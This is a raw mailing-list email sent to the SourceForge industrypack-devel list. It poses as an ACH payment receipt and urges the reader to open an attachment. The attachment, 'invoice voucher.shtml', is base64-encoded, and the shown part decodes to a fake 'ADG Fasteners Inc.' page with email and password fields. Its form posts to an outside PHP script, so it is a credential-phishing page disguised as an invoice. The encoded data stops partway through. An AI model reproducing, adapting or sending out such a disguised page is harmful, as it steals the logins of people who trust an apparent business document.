Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id A129A6CB1EC
	for <lists+industrypack-devel@lfdr.de>; Tue, 28 Mar 2023 00:47:56 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pgvd5-0004fZ-3F
	for lists+industrypack-devel@lfdr.de;
	Mon, 27 Mar 2023 22:47:55 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <smartmobileservices@hotmail.com>) id 1pgvd4-0004fO-28
 for industrypack-devel@lists.sourceforge.net;
 Mon, 27 Mar 2023 22:47:54 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=MIME-Version:Content-Type:List-Unsubscribe:
 Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=sMY4RAZB/LpxbGElwXgYFAyJh4/IwTDQp2wbPinKwpA=; b=SPnyk2RHjf5vtxMBMKJjAhVW7E
 ILbUkaUnCD6f6Ekj80YaPZRZhlU+o5Y+QwMCneQDlzAX1VSPxf1y/bAvQHi4HjQoaioR9pj2/5BSo
 l4MT19VAJOx/d4MB+Es+8bs7Gvle37MhPf192XB5rT+NW2ctDzA+FEQFAuut2n8r1bQ4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=MIME-Version:Content-Type:List-Unsubscribe:Message-ID:Date:Subject:To:
 From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=sMY4RAZB/LpxbGElwXgYFAyJh4/IwTDQp2wbPinKwpA=; b=OS1OcQbLT9xhWJiVYpHfw0yl7y
 rrDbwUHae/NpRIiKqfAG+xLAGaryav1AHvTs8pZz9iRB+OtmcGEdyF9QX+FvWhUKVpPoiQBHoCuqF
 x3ZbFe46OYBpeHNoFH/5hxQijlKMK9uvjEFvqp+DsA6UT62eK6SVNX1pRS+VjnadRwqM=;
Received: from mail-lo2gbr01olkn0189.outbound.protection.outlook.com
 ([104.47.21.189] helo=GBR01-LO2-obe.outbound.protection.outlook.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pgvcz-006CcX-Fh for industrypack-devel@lists.sourceforge.net;
 Mon, 27 Mar 2023 22:47:54 +0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=GXgx5vceQt6OYxmwbw3d4rjO3TReDTbxCMnM93Scfzpn7JBA1LmfgjQBMxcMxpsHkg1j9KPouTjDxU+KMSryUq/S28MPbLdrbQjy+DKMJamSpXypeyZtni0dk43Cg6BSuIdB9pPGqVnABzemSgIc7u05nBXfhc3TUYiQaiCZwvfWnOYJqKaDgnvjS9mjV9o1wZBt604xHhSctdnhOnHfZdyBMSCNgRAbfJAqYkBw3OnimGldW6Hdx24umg95RDIvLKPNGuxdNVytps+QYa0ugoFfWUC+gVRYyN/JC0eG3uzCmXi5eoujsz721GSQYe7Wp7KlONHGsx9PBKgxdh4BXg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=sMY4RAZB/LpxbGElwXgYFAyJh4/IwTDQp2wbPinKwpA=;
 b=iruWiOmewJBazV6lz2/PCHJO4H10GoIX5nbualN4iu3/TKIcQ5USpHa4gEX0VYjh/TTH0xcdEpkSFuNEH2cZTw85CoZGyCYnaMxXf5ozdZ1pnotIYeelOs0N1pnVxRb+ZZeJWpYIZfqqHtCH+fJ/jDMQqMI56vxlNwna4t7/P22abQ5XaSaBQG7NxxGo5dMByhv6dE7nrWsgDZWOdhMAwUoPJrjJLtJ4X8YOHacTjKCKatKPn2lt8yzaCHW1mAS32OsaiXpC4lpwvWS/+yiiquiqIj01bi2BUJQl4z0AqpjH/p3LS9hsegXm49vnKGGtoFweL8sOJDKUz78TUNyc1g==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hotmail.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=sMY4RAZB/LpxbGElwXgYFAyJh4/IwTDQp2wbPinKwpA=;
 b=e6IPXw1lbBarMmV5Y6eTnSe3QcBqQ6TLd7ZwG/S+6mG4OcZX6E5WEsIBPBhlehjck9fi3+FVlThXQwqcAf/+ZaxrgSbXj0tBwVUwp2IQ5JLDUGNPuYPa3bkbvnxXZtBpeUufd/w9ZeprCsXScrgt3G4CCscbs6Jt6SnE9bTqf8chLR2AckkNwibESgNzIGYNV1SFNF+NP1qkQ/F38Un6/XGM/5R9KWBLMzhbEMPlt43cOalNt78mUP3UzU3E0vAxMyH8Iz6ug60PJUR52pBGJZ1GytDl3Pgh9hZ0HREDzA7U1/2ICo9CtA3sHRObV72L2qiGA73szmjz2O1ey65s+w==
Received: from LO2P123MB5178.GBRP123.PROD.OUTLOOK.COM (2603:10a6:600:1e4::11)
 by LO6P123MB6549.GBRP123.PROD.OUTLOOK.COM (2603:10a6:600:2b1::11)
 with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6222.30; Mon, 27 Mar
 2023 22:47:42 +0000
Received: from LO2P123MB5178.GBRP123.PROD.OUTLOOK.COM
 ([fe80::ddfe:c381:a222:b19c]) by LO2P123MB5178.GBRP123.PROD.OUTLOOK.COM
 ([fe80::ddfe:c381:a222:b19c%8]) with mapi id 15.20.6222.030; Mon, 27 Mar 2023
 22:47:42 +0000
From: CFO Sales.Dept<smartmobileservices@hotmail.com>
To: industrypack-devel@lists.sourceforge.net
Date: 28 Mar 2023 00:41:34 +0200
Message-ID: <LO2P123MB5178F69408FA6017A0489BF3B88B9@LO2P123MB5178.GBRP123.PROD.OUTLOOK.COM>
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_D1C54893.4E1351D3"
X-TMN: [1pAjsFuPMuOSUPZGpMqHfQqye+cY2x0p]
X-ClientProxiedBy: AM0PR08CA0021.eurprd08.prod.outlook.com
 (2603:10a6:208:d2::34) To LO2P123MB5178.GBRP123.PROD.OUTLOOK.COM
 (2603:10a6:600:1e4::11)
X-Microsoft-Original-Message-ID: <20230328004133.0ED8C118B8D5AAD3@hotmail.com>
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: LO2P123MB5178:EE_|LO6P123MB6549:EE_
X-MS-Office365-Filtering-Correlation-Id: eb6dd43c-e210-432a-ec55-08db2f146d04
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: dowzt6foKCqUttnq1GshIvNaFGMUbhi7ACiENUDocQgJr2j4UAUxN/bEQcqOGGWo88/j//8v9ru+ypEOQXcLEqBqAzAaIrrX4I5VrZVEhzjsIVSdOpwYZVEzvvHQIOP2PuwhvWz8LPapGStsL1wOg7MkT2bG+eihyfR1eHD9Rm97v25XxyUyrOk5+cCWNVLl53swrHFrCWWCT9uwwYsgIm/q81WHVkuWu1CvTYcGmnMsvNBZ9xfZPYG0y/rAwm3U/Tr6VqGJQWr+XzOilmGZ7dlwwe1xF9U6gNGOjW4mnAOgD4XM0uSM9vlEdrbrOFwzFyOnmHNS41OyKQzsIi4wK13k9L/wRQks5gCaCbOA/fr9rjf7WLVVSdJzkIZmYuRNDQHiop8RoHmyWQlE+9WIxl6xqQubXLIBF5KN19ASgZEMzcVCnMkqPMbg5d+fliBwmuQgXcg8AVOmwVHsSp4XGjhKJMZPC4XMGajxMKJ9Mj9Wo4sl2jZR+SvZOimbMYPb
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?iso-8859-1?Q?3kv4cIyBKtQXsNrmi7/5LBaPrn8DhqvVD1s8ea4Wx2rXb9bu2SoDAlaHhw?=
 =?iso-8859-1?Q?/pfumOOpFQAQLp/CwM2RNfTr6wkPOoNG1uq0rJdI6Kp/l7xqUUw+jEdX6B?=
 =?iso-8859-1?Q?vkhHdCfFz33Zs/WWnS02qHHirkmgv61xznX5Go2lEjPZ6nMGBVJb6q0sMx?=
 =?iso-8859-1?Q?mbIx3k0o4AclHVyw5s/fcRc54l0UFo51NIcL+USZRIoIXq/DrFeeCeyelG?=
 =?iso-8859-1?Q?bfcFpd7FN7MMUGhWBVh+EFnx3PpgcEJRC0q5v9HIDh5Lq2pBvlfPThFBY7?=
 =?iso-8859-1?Q?8jAMuorH9BEEOIhUG9FYd9C72GPXrP+5qdzyh/j8ogOXm7s6lBvUGCC7e7?=
 =?iso-8859-1?Q?x4LGZCLigXquyjuj3y8Tzi62HSo6td2b1Z/7dpKqdoPrwZD6GHAe+nu9ik?=
 =?iso-8859-1?Q?+d4R/2qHrs5lMLELIk9Bq/uovWSuhLwJTI3vINF38Uw48umC8dCZdq3BKy?=
 =?iso-8859-1?Q?hyLHXtK7rd6itDbS59xTuYCHF6FTrwll3E99RxTe2RNOAz30LoDf03oMC5?=
 =?iso-8859-1?Q?Kk3GOfyOxb6p46lAwEBrvwLGlcVhC33aTlUF9p0PRAMOojjXXUgJoadaji?=
 =?iso-8859-1?Q?cnu2gs84bIViaP8RRaAgqHnNtxafdbcTrvTYkc0Czy+DVmfMFj7rHtbF3T?=
 =?iso-8859-1?Q?FJu4PmE06w0zVG4tM87t+qzGpkYQKgTdbRN0mw0WqLwXQm1LGSmzJqlpxb?=
 =?iso-8859-1?Q?QEHpFYPPeb8Le8xDVoAGDm3fxI2WsVGpLboXezFh5p65nTFi0GvH4tkHOA?=
 =?iso-8859-1?Q?PNmQGtGa5mDZY5H16r5qXcSS7Y0c8leVuiqSFXex/27NHMvoBt37GFNXNl?=
 =?iso-8859-1?Q?3bt2UVV9eBD5l5Hx9WSAcX/zV8CdG0PTJ1DLXSg9x0sbIkFtekbGfD2ltV?=
 =?iso-8859-1?Q?Lc9jAkGbBde6tN8JP7/Xz80ZAWmXjEBD34HTD8JAulTdMxpDvA3k1nMbYp?=
 =?iso-8859-1?Q?MvrZW7HD53Yla6I3xKp0J5UqNnE1QUgTGREuUTM28S/nxa/UyuMahPF5Cf?=
 =?iso-8859-1?Q?pz7+lvjuzYkAVCNEr2fEhNI1FIcbNFnrtpyiW0d8jrv5rhYgpT4VOqIcDv?=
 =?iso-8859-1?Q?dVcBNDLi3rk8kiL0YlBBSKfve8m14/u3HNQ6jL9ikKzrRe49TkCwv1kMIT?=
 =?iso-8859-1?Q?QKSjAfnl28OLaybC2xBx2MAwbCrvevc5tvrnQV7mL+LDaXtN1Q5C/YmJcO?=
 =?iso-8859-1?Q?s2DafwksPIOQzDmttz8eBeoBLH8/TlPz6BWNuxjkxGHghPfyBYYEFXoF9t?=
 =?iso-8859-1?Q?Y7b9zQyTPNojPD1EJNrawqdd1Oz8HVwG5oVCwDZp1KEtACQm+r8Lh6qR+L?=
 =?iso-8859-1?Q?Irof?=
X-OriginatorOrg: sct-15-20-4755-11-msonline-outlook-2ec8f.templateTenant
X-MS-Exchange-CrossTenant-Network-Message-Id: eb6dd43c-e210-432a-ec55-08db2f146d04
X-MS-Exchange-CrossTenant-AuthSource: LO2P123MB5178.GBRP123.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 27 Mar 2023 22:41:37.9694 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: LO6P123MB6549
X-Spam-Score: 5.6 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Dear industrypack-devel, FYI, attached file. The complete
 version of this receipt has been attached to this
 e-mail:industrypack-devel@lists.sourceforge.net, See att [...] 
 Content analysis details:   (5.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.0 RCVD_IN_DNSWL_NONE     RBL: Sender listed at https://www.dnswl.org/,
 no trust [104.47.21.189 listed in list.dnswl.org]
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
 provider [smartmobileservices[at]hotmail.com]
 1.2 FORGED_HOTMAIL_RCVD2   hotmail.com 'From' address, but no
 'Received:'
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 1.7 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
 2.8 FROM_MISSP_FREEMAIL    From misspaced + freemail provider
X-Headers-End: 1pgvcz-006CcX-Fh
Subject: [Industrypack-devel] ACH Payment sent On: 3/28/2023 0:41:33
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

------=_NextPart_000_0012_D1C54893.4E1351D3
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
1"><meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19699"></head>
<body><span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-s=
erif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
IGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2;=
 LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial">Dear industrypack-devel,</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">FYI, attached file.</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">
The complete version of this receipt has been attached to this<span>&nbsp;<=
/span><a style=3D"COLOR: rgb(17,85,204)" href=3D"mailto:industrypack-devel@=
lists.sourceforge.net" target=3D"_blank">e-mail:industrypack-devel@lists.so=
urceforge.net</a>,</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">------------------------------<wbr>----</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">See attached.</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">Thanks for your business</span></body></html>=

------=_NextPart_000_0012_D1C54893.4E1351D3
Content-Type: application/octet-stream; name="invoice voucher.shtml"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="invoice voucher.shtml"

PGh0bWw+DQo8aGVhZD4NCgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2
aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPg0KCTxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29t
cGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSxjaHJvbWU9MSIgLz4NCgk8dGl0bGU+QURHIEZhc3Rl
bmVycyBJbmMuIDwvdGl0bGU+DQoNCgk8c3R5bGU+DQpib2R5LCBodG1sIHsgaGVpZ2h0OiAxMDAl
O21hcmdpbjogMDsgZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7DQp9
DQoqIHsNCiAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCn0NCi5iZy1pbWFnZSB7DQogIC8qIFRo
ZSBpbWFnZSB1c2VkICovDQogIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiaHR0cHM6Ly9pLnBpbmlt
Zy5jb20vMjM2eC80Ni84NS8yZC80Njg1MmRkNWZhNTFiNjliZGY1Y2M1YzY1YzcxOGVkOS5qcGci
KTsNCiAgIG9wYWNpdHk6IDAuNTsNCiAgLyogQWRkIHRoZSBibHVyIGVmZmVjdCAqLyBmaWx0ZXI6
IGJsdXIoLXB4KTsgLXdlYmtpdC1maWx0ZXI6IGJsdXIoLXB4KTsNCiAgLyogRnVsbCBoZWlnaHQg
Ki8gaGVpZ2h0OiAxNTAlOyAvKiBDZW50ZXIgYW5kIHNjYWxlIHRoZSBpbWFnZSBuaWNlbHkgKi8N
CiAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyOyBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVw
ZWF0OyBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KfQ0KDQovKiBQb3NpdGlvbiB0ZXh0IGluIHRo
ZSBtaWRkbGUgb2YgdGhlIHBhZ2UvaW1hZ2UgKi8NCi5iZy10ZXh0IHsNCiAgYmFja2dyb3VuZDog
IzE0M2IwODsNCiAgd2lkdGg6MzcwcHg7IGhlaWdodDo0NTBweDsgLXdlYmtpdC1ib3gtc2hhZG93
OiAxcHggMXB4IDE1cHggMXB4ICMwMDAwMDA7DQogIGJveC1zaGFkb3c6IDFweCAxcHggMTVweCAx
cHggIzAwMDAwMDsgYm9yZGVyLXJhZGl1czogMXB4IDI1cHggMXB4IDQwcHg7DQoNCiAgcG9zaXRp
b246IGFic29sdXRlOyB0b3A6IDUwJTsgbGVmdDogNTAlOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgt
NTAlLCAtNTAlKTsgei1pbmRleDogMjsgdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KaW5wdXRbdHlw
ZT1zdWJtaXRdIHsNCiAgd2lkdGg6MjkwcHg7IGhlaWdodDo0MHB4OyBmb250LWZhbWlseTogYXJp
YWw7IGZvbnQtc2l6ZTogMTRweDsgY29sb3I6I0ZGRjsgYmFja2dyb3VuZC1jb2xvcjogIzA0ODlC
MTsgYm9yZGVyOiBzb2xpZCAxcHggIzA0ODlCMTsgYm9yZGVyLXJhZGl1czogMnB4IDEwcHggMnB4
IDEwcHg7DQogIC13ZWJraXQtYm94LXNoYWRvdzogMnB4IDJweCAxNXB4IDVweCAjMDAwMDAwOyBi
b3gtc2hhZG93OiAycHggMnB4IDE1cHggNXB4ICMwMDAwMDA7ICBmb250LXdlaWdodDpib2xkOw0K
fQ0KaW5wdXRbdHlwZT1wYXNzd29yZF0gew0KICB3aWR0aDoyOTBweDsgaGVpZ2h0OjM1cHg7IGZv
bnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxM3B4OyBib3JkZXItcmFkaXVzOiAzcHg7DQog
IGNvbG9yOiMwMDAwMDA7IGJhY2tncm91bmQtY29sb3I6ICNGRkY7IGJvcmRlcjogc29saWQgMXB4
ICNGRkY7IHBhZGRpbmc6IDEwcHg7DQogIH0NCmlucHV0W3R5cGU9ZW1haWxdIHsNCiAgd2lkdGg6
MjkwcHg7IGhlaWdodDozNXB4OyBmb250LWZhbWlseTogYXJpYWw7IGZvbnQtc2l6ZTogMTNweDsg
Ym9yZGVyLXJhZGl1czogM3B4Ow0KICBjb2xvcjojMDAwMDAwOyBiYWNrZ3JvdW5kLWNvbG9yOiAj
RkZGOyBib3JkZXI6IHNvbGlkIDFweCAjRkZGOyBwYWRkaW5nOiAxMHB4Ow0KICAgIH0NCjwvc3R5
bGU+DQoNCg0KPC90ZD48L3RyPg0KDQo8dHI+PHRkIGhlaWdodD0iNzUlIiAgYmdjb2xvcj0iI0ZG
RiI+DQo8ZGl2IGNsYXNzPSJiZy1pbWFnZSI+PC9kaXY+DQo8ZGl2IGNsYXNzPSJiZy10ZXh0Ij4N
Cg0KDQoJPHRhYmxlIGFsaWduPSJjZW50ZXIiIGNlbGxzcGFjaW5nPSIwIj4NCgk8dHI+PHRkIHN0
eWxlPSJoZWlnaHQ6MTBweDsiPjwvdGQ+PC90cj4NCg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWln
aHQ6OHB4OyI+PC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkPg0KCQkJCQk8Zm9ybSBtZXRob2Q9InBv
c3QiIGFjdGlvbj0iaHR0cHM6Ly9rYWRtb25sdGQuY29tL296ZW5pdGhncm91cHMvemVkMDAyLnBo
cCI+DQoJCQkJCTwvdGQ+PC90cj4NCgkJCQkJPHRyPjx0ZD4NCgkJCQkJCQkJPC9mb250Pg0KCQkJ
CQkJCTwvZGl2Pg0KCQkJCQk8L3RkPjwvdHI+DQoJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDo3
cHg7Ij48L3RkPjwvdHI+DQoJCQkJCTx0cj48dGQ+DQoJCQkJCQkJPGRpdiBhbGlnbj0iY2VudGVy
Ij4NCgkJCQkJCQkJPGZvbnQgZmFjZT0iYXJpYWwiIHNpemU9IjEiIGNvbG9yPSIjRkZGIj4NCgkJ
CQkJCQkJCTxiPjwvYj4NCgkJCQkJCQkJPC9mb250Pg0KCQkJCQkJCTwvZGl2Pg0KCQkJCQk8L3Rk
PjwvdHI+DQoJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDo3cHg7Ij48L3RkPjwvdHI+DQoNCgkJ
CQkJPHRyPjx0ZD4NCgkJCQkJCQk8ZGl2IGFsaWduPSJjZW50ZXIiPg0KCQkJCQkJCQk8aW1nIHNy
Yz0iaHR0cHM6Ly9lbmNyeXB0ZWQtdGJuMC5nc3RhdGljLmNvbS9pbWFnZXM/cT10Ym46QU5kOUdj
VE5wblB6SFQxSUllQ2l4MnZTcy1NWDNkY3FncXZycW1IN1RnJnVzcXA9Q0FVIj4NCgkJCQkJCQk8
L2Rpdj4NCgkJCQkJPC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6OyI+PC90
ZD48L3RyPg0KDQoJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDo1cHg7Ij4NCgkJCQkJCQkJPGRp
